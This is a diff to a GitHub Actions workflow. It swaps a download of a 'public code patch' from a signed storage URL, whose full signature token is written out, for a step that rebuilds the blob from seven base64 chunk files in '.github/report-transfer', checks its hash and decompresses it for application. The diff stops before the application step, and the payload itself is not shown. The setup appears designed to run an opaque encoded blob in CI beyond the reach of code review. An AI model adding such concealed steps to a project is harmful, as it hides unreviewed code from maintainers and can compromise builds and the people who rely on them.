@@ -17,14 +17,13 @@ jobs:
         with:
           python-version: '3.12'
       - name: Verify and apply public code patch
-        env:
-          PUBLIC_PATCH_URL: 'https://sdmntprpolandcentral.oaiusercontent.com/files/00000000-5f08-820a-8ddf-afb86960cfaa/raw?se=2026-09-30T21%3A53%3A10Z&sp=r&sv=2026-02-06&sr=b&scid=b5ad67d8-dce4-59ca-a406-0e477f8cfc73&skoid=d4d17077-8f33-42a9-bd8b-aa9d5eaf5320&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2026-09-30T21%3A17%3A59Z&ske=2026-10-01T21%3A17%3A59Z&sks=b&skv=2026-02-06&sig=KbtAM65ZQOkHHuD7izbb2JY1%2BkuscLC6Uwasb1eB9i8%3D'
         run: |
           python - <<'PY'
-          import hashlib,lzma,os,subprocess
-          from urllib.request import urlopen
-          with urlopen(os.environ['PUBLIC_PATCH_URL'],timeout=40) as response:
-              data=response.read(100000)
+          import base64,hashlib,lzma,subprocess
+          from pathlib import Path
+          parts=sorted(Path('.github/report-transfer').glob('chunk*.b64'))
+          assert len(parts)==7
+          data=base64.b64decode(''.join(p.read_text().strip() for p in parts),validate=True)
           assert len(data)==60572
           assert hashlib.sha256(data).hexdigest()=='3d3734bcc402f216ac6af2e2d1fb70b7309a91cad755e0ed2aade27d1f493d18'
           patch=lzma.decompress(data)
